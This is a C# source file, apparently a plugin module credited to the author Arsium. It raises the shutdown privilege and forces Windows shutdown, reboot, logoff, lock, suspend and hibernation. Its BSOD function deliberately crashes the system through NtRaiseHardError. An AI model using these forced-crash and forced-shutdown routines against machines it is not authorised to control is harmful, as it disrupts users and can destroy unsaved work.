using System;
using static Plugin.Imports;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class PowerManager
    {
        private const uint errorCode = 0x0000DEAD;
        private static NTSTATUS seShutdownStatus { get; set; }
        static PowerManager() 
        {
            bool t1 = false;
            seShutdownStatus = RtlAdjustPrivilege(RTL_PRIVILEGES.SeShutdownPrivilege, true, false, out t1);
        }

        internal static void ShutDown()
        {
            if (seShutdownStatus == NTSTATUS.STATUS_SUCCESS)
            {
                ExitWindowsEx
                (
                    EXIT_WINDOWS_FLAGS.EWX_SHUTDOWN
                    | EXIT_WINDOWS_FLAGS.EWX_FORCE,
                    EXIT_WINDOWS_REASON.SHTDN_REASON_MAJOR_LEGACY_API
                );
            }
        }

        internal static void Reboot() 
        {
            if (seShutdownStatus == NTSTATUS.STATUS_SUCCESS)
            {
                ExitWindowsEx
                (
                    EXIT_WINDOWS_FLAGS.EWX_REBOOT
                    | EXIT_WINDOWS_FLAGS.EWX_FORCE,
                    EXIT_WINDOWS_REASON.SHTDN_REASON_MAJOR_LEGACY_API
                );
            }
        }

        internal static void LogOut() 
        {
            if (seShutdownStatus == NTSTATUS.STATUS_SUCCESS)
            {
                ExitWindowsEx
                (
                    EXIT_WINDOWS_FLAGS.EWX_LOGOFF
                    | EXIT_WINDOWS_FLAGS.EWX_FORCE,
                    EXIT_WINDOWS_REASON.SHTDN_REASON_MAJOR_LEGACY_API
                );
            }
        }

        internal static void BSOD() 
        {
            if (seShutdownStatus == NTSTATUS.STATUS_SUCCESS) 
            {
                HARDERROR_RESPONSE response = HARDERROR_RESPONSE.ResponseReturnToCaller;
                NtRaiseHardError(errorCode, 0, 0, IntPtr.Zero, HARDERROR_RESPONSE_OPTION.OptionShutdownSystem, out response);
                /*uint t2 = 0;
                NtRaiseHardError(errorCode, 0, 0, IntPtr.Zero, 6, out t2);*/
            }
        }

        internal static void LockWorkstation() 
        {
            LockWorkStation();
        }

        internal static void Suspend() 
        {
            if (seShutdownStatus == NTSTATUS.STATUS_SUCCESS)
            {
                SetSuspendState(false, true, true);
            }
        }

        internal static void Hibernate()
        {
            if (seShutdownStatus == NTSTATUS.STATUS_SUCCESS)
            {
                SetSuspendState(true, true, true);
            }
        }
    }
}
